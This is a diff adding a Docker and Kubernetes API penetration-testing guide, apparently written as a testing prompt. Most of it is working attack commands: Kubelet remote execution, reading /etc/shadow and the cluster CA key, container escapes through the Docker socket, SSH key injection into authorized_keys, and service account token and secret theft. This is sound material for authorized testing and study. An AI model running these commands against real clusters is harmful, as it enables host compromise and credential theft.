@@ -1,0 +1,481 @@
+<docker_kubernetes_api_security_guide>
+<title>DOCKER AND KUBERNETES API SECURITY TESTING</title>
+
+<critical>Container orchestration APIs are high-value targets. Exposed Docker sockets, misconfigured Kubelets, service account token abuse, and RBAC misconfigurations can lead to cluster compromise and container escapes. Testing must cover all API surfaces and authentication mechanisms.</critical>
+
+<scope>
+- Kubelet API exploitation
+- Docker socket exposure
+- Service account token abuse
+- RBAC misconfigurations
+- Pod security policy bypass
+- Container escape techniques
+- Secrets management
+</scope>
+
+<methodology>
+1. Identify exposed container APIs and endpoints.
+2. Test authentication and authorization on APIs.
+3. Probe service account permissions.
+4. Analyze RBAC configurations.
+5. Test container security boundaries.
+6. Check secrets exposure and management.
+</methodology>
+
+<kubelet_api>
+<kubelet_exploitation>
+{% raw %}
+# Kubelet API testing:
+
+# Default ports:
+# 10250 - HTTPS (authenticated)
+# 10255 - HTTP (read-only, often unauthenticated)
+
+# Read-only API (10255):
+curl http://node:10255/pods
+curl http://node:10255/spec
+curl http://node:10255/stats/summary
+curl http://node:10255/metrics
+
+# Authenticated API (10250):
+# With service account token:
+curl -k https://node:10250/pods \
+  -H "Authorization: Bearer $TOKEN"
+
+# Execute command in pod:
+curl -k -X POST \
+  "https://node:10250/run/<namespace>/<pod>/<container>" \
+  -d "cmd=id"
+
+# Exec into container:
+curl -k -X POST \
+  "https://node:10250/exec/<namespace>/<pod>/<container>" \
+  -d "command=cat&command=/etc/passwd&input=1&output=1&tty=1"
+
+# Get container logs:
+curl -k https://node:10250/containerLogs/<ns>/<pod>/<container>
+{% endraw %}
+</kubelet_exploitation>
+
+<kubelet_vulnerabilities>
+{% raw %}
+# Kubelet vulnerability testing:
+
+# 1. Anonymous authentication:
+# Check if --anonymous-auth=true
+curl -k https://node:10250/pods
+
+# 2. Missing authorization:
+# --authorization-mode=AlwaysAllow
+curl -k https://node:10250/run/kube-system/kube-apiserver-master/kube-apiserver \
+  -d "cmd=cat /etc/kubernetes/pki/ca.key"
+
+# 3. Debug handlers:
+curl -k https://node:10250/debug/pprof/
+curl -k https://node:10250/debug/flags/v
+
+# 4. cAdvisor metrics:
+curl http://node:4194/metrics
+curl http://node:4194/containers/
+
+# 5. Node information disclosure:
+curl -k https://node:10250/configz
+curl -k https://node:10250/healthz
+{% endraw %}
+</kubelet_vulnerabilities>
+</kubelet_api>
+
+<docker_socket>
+<socket_exposure>
+{% raw %}
+# Docker socket exploitation:
+
+# Check for exposed socket:
+curl --unix-socket /var/run/docker.sock http://localhost/version
+curl http://localhost:2375/version
+curl http://localhost:2376/version
+
+# List containers:
+curl --unix-socket /var/run/docker.sock http://localhost/containers/json
+
+# List images:
+curl --unix-socket /var/run/docker.sock http://localhost/images/json
+
+# Execute command in container:
+curl -X POST --unix-socket /var/run/docker.sock \
+  "http://localhost/containers/{id}/exec" \
+  -H "Content-Type: application/json" \
+  -d '{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Cmd":["cat","/etc/passwd"],"Tty":true}'
+
+# Start exec:
+curl -X POST --unix-socket /var/run/docker.sock \
+  "http://localhost/exec/{exec_id}/start" \
+  -H "Content-Type: application/json" \
+  -d '{"Detach":false,"Tty":true}'
+{% endraw %}
+</socket_exposure>
+
+<container_escape>
+{% raw %}
+# Container escape via Docker socket:
+
+# 1. Mount host filesystem:
+curl -X POST --unix-socket /var/run/docker.sock \
+  "http://localhost/containers/create" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "Image": "alpine",
+    "Cmd": ["cat", "/mnt/etc/shadow"],
+    "HostConfig": {
+      "Binds": ["/:/mnt"]
+    }
+  }'
+
+# Start and get output:
+curl -X POST --unix-socket /var/run/docker.sock \
+  "http://localhost/containers/{id}/start"
+
+curl --unix-socket /var/run/docker.sock \
+  "http://localhost/containers/{id}/logs?stdout=true"
+
+# 2. Privileged container:
+{
+  "Image": "alpine",
+  "Cmd": ["nsenter", "--mount=/proc/1/ns/mnt", "--", "/bin/bash"],
+  "HostConfig": {
+    "Privileged": true,
+    "PidMode": "host"
+  }
+}
+
+# 3. Write to host:
+# Create container that writes SSH key to host
+{
+  "Binds": ["/root/.ssh:/mnt/.ssh"],
+  "Cmd": ["sh", "-c", "echo 'ssh-rsa AAAA...' >> /mnt/.ssh/authorized_keys"]
+}
+{% endraw %}
+</container_escape>
+</docker_socket>
+
+<service_account>
+<token_abuse>
+{% raw %}
+# Service account token exploitation:
+
+# Default token location in pod:
+/var/run/secrets/kubernetes.io/serviceaccount/token
+/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+/var/run/secrets/kubernetes.io/serviceaccount/namespace
+
+# Using the token:
+export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+
+# Query API server:
+curl -k https://kubernetes.default.svc/api/v1/namespaces \
+  -H "Authorization: Bearer $TOKEN"
+
+# Check permissions:
+kubectl auth can-i --list
+
+# Common overprivileged permissions:
+# - secrets read/write
+# - pods/exec
+# - create pods
+# - cluster-admin binding
+{% endraw %}
+</token_abuse>
+
+<token_attacks>
+{% raw %}
+# Service account token attacks:
+
+# 1. Token extraction from pod:
+kubectl exec -it pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# 2. Token from etcd (if accessible):
+etcdctl get /registry/secrets/kube-system/default-token-xxxxx
+
+# 3. Token from node:
+# If access to node filesystem:
+find /var/lib/kubelet/pods -name token
+
+# 4. Token from environment:
+# Some apps expose SA token in env
+env | grep -i token
+env | grep -i kube
+
+# 5. Token from memory:
+# Dump container memory
+# Search for token patterns
+{% endraw %}
+</token_attacks>
+</service_account>
+
+<rbac_exploitation>
+<rbac_misconfigurations>
+{% raw %}
+# RBAC misconfiguration testing:
+
+# 1. Check current permissions:
+kubectl auth can-i create pods
+kubectl auth can-i get secrets
+kubectl auth can-i '*' '*'
+
+# 2. Wildcard permissions:
+# Role with: verbs: ["*"], resources: ["*"]
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+rules:
+- apiGroups: ["*"]
+  resources: ["*"]
+  verbs: ["*"]
+
+# 3. Privilege escalation paths:
+# pods/exec -> RCE in any pod
+# secrets -> access all secrets
+# pods -> create privileged pod
+# nodes/proxy -> access kubelet
+# persistentvolumes -> access node storage
+
+# 4. ClusterRoleBinding to default SA:
+kubectl get clusterrolebindings -o wide | grep default
+
+# 5. Dangerous role combinations:
+# - create pods + create secrets
+# - get secrets + create pods
+# - impersonate users
+{% endraw %}
+</rbac_misconfigurations>
+
+<privilege_escalation>
+{% raw %}
+# RBAC privilege escalation:
+
+# 1. Create pod with host access:
+kubectl create -f - <<EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: priv-pod
+spec:
+  hostPID: true
+  hostNetwork: true
+  containers:
+  - name: priv
+    image: alpine
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: host-root
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+EOF
+
+# 2. Access another SA token:
+# If can create pods in namespace with powerful SA
+kubectl create pod --serviceaccount=admin-sa
+
+# 3. Impersonation:
+kubectl auth can-i impersonate users
+kubectl --as=admin get secrets
+
+# 4. Node access via daemonset:
+# If can create daemonsets
+# Deploy to all nodes
+{% endraw %}
+</privilege_escalation>
+</rbac_exploitation>
+
+<pod_security>
+<security_policy_bypass>
+{% raw %}
+# Pod Security Policy/Standards bypass:
+
+# 1. Capabilities escalation:
+securityContext:
+  capabilities:
+    add: ["SYS_ADMIN", "NET_ADMIN"]
+
+# 2. Privileged containers:
+securityContext:
+  privileged: true
+
+# 3. HostPath mount:
+volumes:
+- name: host
+  hostPath:
+    path: /
+
+# 4. Host namespaces:
+hostPID: true
+hostNetwork: true
+hostIPC: true
+
+# 5. Proc mount:
+securityContext:
+  procMount: Unmasked
+
+# 6. Sysctl settings:
+securityContext:
+  sysctls:
+  - name: kernel.shm_rmid_forced
+    value: "1"
+{% endraw %}
+</security_policy_bypass>
+
+<container_escape_techniques>
+{% raw %}
+# Container escape techniques:
+
+# 1. Via privileged mode:
+# Access host devices
+ls /dev
+mount /dev/sda1 /mnt
+chroot /mnt
+
+# 2. Via SYS_ADMIN capability:
+mount -t cgroup -o memory cgroup /tmp/cgroup
+# Escape via cgroup release_agent
+
+# 3. Via host PID namespace:
+nsenter -t 1 -m -u -i -n -p -- /bin/bash
+
+# 4. Via host network:
+# Access internal services
+# Attack other pods
+
+# 5. Via writable hostPath:
+# Write to /etc/cron.d
+# Modify /root/.ssh/authorized_keys
+
+# 6. Via Docker socket:
+# If mounted in container
+docker -H unix:///var/run/docker.sock ...
+{% endraw %}
+</container_escape_techniques>
+</pod_security>
+
+<secrets_exposure>
+<secrets_testing>
+{% raw %}
+# Kubernetes secrets testing:
+
+# List secrets:
+kubectl get secrets -A
+kubectl get secrets -n kube-system
+
+# Read secret:
+kubectl get secret <name> -o yaml
+kubectl get secret <name> -o jsonpath='{.data}'
+
+# Decode secret:
+kubectl get secret <name> -o jsonpath='{.data.password}' | base64 -d
+
+# Secrets in etcd:
+etcdctl get /registry/secrets --prefix --keys-only
+
+# Environment variable exposure:
+kubectl exec pod -- env | grep -i secret
+kubectl exec pod -- env | grep -i password
+kubectl exec pod -- env | grep -i key
+
+# Mounted secrets:
+kubectl exec pod -- ls /etc/secrets
+kubectl exec pod -- cat /etc/secrets/password
+{% endraw %}
+</secrets_testing>
+
+<secrets_vulnerabilities>
+{% raw %}
+# Secrets security issues:
+
+# 1. Secrets in pod specs:
+# Visible via kubectl describe pod
+env:
+- name: DB_PASSWORD
+  value: "hardcoded"
+
+# 2. Secrets in configmaps:
+# Not encrypted, easily readable
+
+# 3. Default service account secrets:
+# All pods get SA token by default
+
+# 4. etcd encryption:
+# Check if encryption at rest enabled
+kubectl get secrets -o yaml | head
+
+# 5. Secret RBAC:
+# Check who can read secrets
+kubectl auth can-i get secrets --all-namespaces
+{% endraw %}
+</secrets_vulnerabilities>
+</secrets_exposure>
+
+<common_payloads>
+{% raw %}
+# Kubelet exec:
+curl -k https://node:10250/run/ns/pod/container -d "cmd=id"
+
+# Docker socket:
+curl --unix-socket /var/run/docker.sock http://localhost/containers/json
+
+# Service account:
+curl -k https://kubernetes.default.svc/api -H "Authorization: Bearer $TOKEN"
+
+# Privileged pod:
+hostPID: true, privileged: true
+
+# Secret access:
+kubectl get secret -o yaml
+
+# RBAC check:
+kubectl auth can-i --list
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate Kubelet API access or code execution.
+2. Show Docker socket exploitation.
+3. Prove service account token abuse.
+4. Document RBAC misconfiguration exploitation.
+5. Provide container escape evidence.
+</validation>
+
+<false_positives>
+- Kubelet with proper authentication and authorization
+- Docker socket not exposed to containers
+- Service accounts with minimal permissions
+- Proper RBAC with least privilege
+- Pod Security Standards enforced
+- Secrets encrypted at rest
+</false_positives>
+
+<impact>
+- Full cluster compromise
+- Container escape to host
+- Lateral movement between pods
+- Secret and credential theft
+- Data exfiltration
+- Persistent access via modified images
+</impact>
+
+<pro_tips>
+1. Check Kubelet ports 10250 and 10255.
+2. Look for Docker socket mounts in pods.
+3. Extract and test service account tokens.
+4. Use kubectl auth can-i to check permissions.
+5. Look for privileged containers.
+6. Check for hostPath mounts.
+7. Test etcd access if available.
+8. Look for exposed dashboards.
+9. Check for overprivileged clusterrolebindings.
+10. Document cluster version and configuration.
+</pro_tips>
+
+<remember>Container orchestration security is about layers: API authentication, RBAC, pod security, and network policies. A single misconfiguration in any layer can lead to complete cluster compromise. Always test all API surfaces and permission boundaries.</remember>
+</docker_kubernetes_api_security_guide>
